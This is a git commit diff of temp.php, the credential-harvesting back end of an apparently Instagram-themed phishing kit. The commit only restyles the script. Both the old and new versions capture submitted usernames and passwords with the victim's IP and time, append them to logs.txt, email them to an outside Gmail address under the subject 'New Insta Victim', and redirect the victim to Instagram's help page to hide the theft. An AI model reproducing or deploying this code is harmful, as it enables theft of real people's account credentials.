1208fb7629a72b87cd31e9265cbdb23f66c534e5
Rad LaSad <40401197+Brayacon@users.noreply.github.com>
2021-01-15 19:33:13 +0300

    Update temp.php

--- temp.php
+++ temp.php
@@ -5,29 +5,29 @@
 #██║  ██║██╔══╝  ██╔══╝  ██╔═══╝  ╚═══██╗
 #██████╔╝███████╗███████╗██║     ██████╔╝
 #╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ 
-#         By Manisso & IcoDz    
-                                                                                                                   
-$date = gmdate ("d-n-Y");
-$time = gmdate ("H:i:s");
-$ip = $_SERVER['REMOTE_ADDR'];
-$hostname = gethostbyaddr($ip);
-$message .= "========== Instagram Login ==========\n";
-$message .= "User: ".$_POST['username']."\n";
-$message .= "Pass: ".$_POST['password']."\n";
-$message .= "----------\n";
-$message .= "IP: ".$ip."\n";
-$message .= "Log : $time / $date \n";
-$rnessage = "$message\n";
-$send= "radrex460@gmail.com";
-$subject = "New Instagram Victim | $ip";
-$headers = "From: Instagram";
-$file = fopen("logs.txt","ab");
-fwrite($file,$message);
-fclose($file);
-$str=array($send, $IWP); foreach ($str as $send)
-if(mail($send,$subject,$rnessage,$headers) != false)
-{
-mail($Send,$subject,$rnessage,$headers);
-}
-header("Location: https://help.instagram.com/");
+#         By Bradd Connel   
+if(isset($_POST['submit'])){                                                                                                                  
+    $date = gmdate ("d-n-Y");
+    $time = gmdate ("H:i:s");
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $hostname = gethostbyaddr($ip);
+    $message .= "========== Instagram Login ==========\n";
+    $message .= "User: ".$_POST['username']."\n";
+    $message .= "Pass: ".$_POST['password']."\n";
+    $message .= "----------\n";
+    $message .= "IP: ".$ip."\n";
+    $message .= "Log : $time / $date \n";
+    $rmessage = "$message\n";
+    $send= "radrex460@gmail.com";
+    $subject = "New Insta Victim | $ip";
+    $headers = "From: Bradd kcah";
+    $file = fopen("logs.txt","ab");
+    fwrite($file,$message);
+    fclose($file);
+    $str=array($send, $IWP); foreach ($str as $send)
+
+    mail($send,$subject,$rmessage,$headers);
+
+    header("Location: https://help.instagram.com/");
+    }
 ?>
